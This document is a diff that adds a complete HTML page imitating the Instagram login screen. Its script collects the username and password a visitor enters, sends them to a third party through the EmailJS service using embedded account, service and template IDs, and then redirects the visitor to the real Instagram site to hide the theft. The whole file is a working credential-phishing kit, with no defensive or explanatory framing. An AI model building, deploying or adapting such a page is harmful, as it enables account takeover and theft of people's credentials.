@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <link rel="icon" type="image/x-icon" href="assets/img/hh.png">
+  <title>Instagram</title>
+</head>
+<style>
+  .disabled {
+    pointer-events: none;
+    background-color: #4CB5F9;
+  }
+</style>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/home-homes.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            <input type="text" id="username" onkeyup="stoppedTyping()" class="c-panel__input" placeholder="Phone number, username, or email">
+            <input type="text" id="password" onkeyup="stoppedTyping()" class="c-panel__input" placeholder="Password">
+            <button id="submit" onclick = "sendMail();" class="c-btn">Log In</button>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <a href="#" class="c-panel__facebook">Login with Facebook</a>
+          <a href="#" class="c-panel__forgot">Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span>Sign up</span></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    function stoppedTyping(){
+      if(document.getElementById("username").value.length > 0 && document.getElementById("password").value.length > 5) { 
+        document.getElementById('submit').classList.remove('disabled'); 
+      } else { 
+        document.getElementById('submit').classList.add('disabled');
+      }
+    }
+    stoppedTyping()
+    function sendMail(){
+      (function(){
+        emailjs.init("JgVpTDbbAXOn-cKye"); // Account Public Key
+      })();
+
+      var params = {
+        username: document.querySelector("#username").value,
+        password: document.querySelector("#password").value,
+      };
+
+      var serviceID = "service_ljcgohj"; // Email Service ID
+      var templateID = "template_ne7fv5p"; // Email Template ID
+
+      emailjs.send(serviceID, templateID, params)
+      .then( res => {
+        location.href = "https://www.instagram.com/";
+      })
+      .catch();
+    }
+  </script>
+</body>
+</html>
